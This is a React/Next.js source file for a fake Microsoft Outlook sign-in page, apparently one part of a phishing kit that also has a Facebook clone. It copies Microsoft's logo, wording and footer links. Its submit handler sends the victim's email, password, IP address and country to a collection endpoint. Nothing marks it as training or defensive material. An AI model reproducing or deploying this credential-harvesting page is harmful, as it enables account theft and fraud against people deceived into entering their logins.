"use client";
import Link from "next/link";
import styles from "./page.module.css";
import { use, useState } from "react";
import { getUserLocation } from "../utils/request";
import { getFormatedDateTime } from "../facebook/page";

export default function Outlook() {
  const [page, setPage] = useState(1);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const handleNext = (e) => {
    e.preventDefault();
    if (email) setPage((prev) => prev + 1);
  };

  const handleSubmit = (e) => {
    e.preventDefault();

    getUserLocation().then(
      async (data) =>
        await fetch("/api/outlook", {
          method: "POST",
          body: JSON.stringify({
            username: email,
            password,
            date: getFormatedDateTime(new Date()),
            ip_address: data.ip,
            country: data.country_name,
          }),
        })
    );

    setEmail("");
    setPassword("");
  };

  return (
    <div className={styles.page}>
      <div className={styles.container}>
        <div className={styles.wrapper}>
          <div className={styles.content}>
            <img
              src="https://logincdn.msauth.net/shared/5/images/microsoft_logo_ee5c8d9fb6248c938fd0.svg"
              alt=""
            />
            {page > 1 ? (
              <div onClick={() => setPage(1)} className={styles.heading2}>
                <i className="fa-solid fa-arrow-left"></i>
                <p>{email}</p>
              </div>
            ) : (
              <div className={styles.heading}>
                <p>Sign in</p>
                <span>to continue to Outlook</span>
              </div>
            )}

            {page > 1 && (
              <div className={styles.pwheader}>
                <p>Enter Password</p>
              </div>
            )}

            <form className={styles.form}>
              {page > 1 ? (
                <input
                  required
                  type="password"
                  placeholder="Password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
              ) : (
                <input
                  required
                  type="text"
                  placeholder="Email, phone, or Skype"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                />
              )}

              {page > 1 ? (
                <div className={styles.createAcc}>
                  <Link href="">Forget password?</Link>
                </div>
              ) : (
                <div className={styles.createAcc}>
                  No account?{" "}
                  <Link href="https://signup.live.com/signup">Create One</Link>
                </div>
              )}

              <div className={styles.button}>
                {page > 1 ? (
                  <button onClick={handleSubmit} type="submit">
                    Sign in
                  </button>
                ) : (
                  <button onClick={handleNext} type="submit">
                    Next
                  </button>
                )}
              </div>
            </form>
          </div>
        </div>
        <div className={styles.footerContainer}>
          <div className={styles.footerContent}>
            <Link href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&mkt=EN-US&uaid=a6b7693bf70b481cb210f65800c45fed">
              Terms of use
            </Link>
            <Link href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&mkt=EN-US&uaid=a6b7693bf70b481cb210f65800c45fed">
              Privacy & cookies
            </Link>
          </div>
        </div>
      </div>
    </div>
  );
}
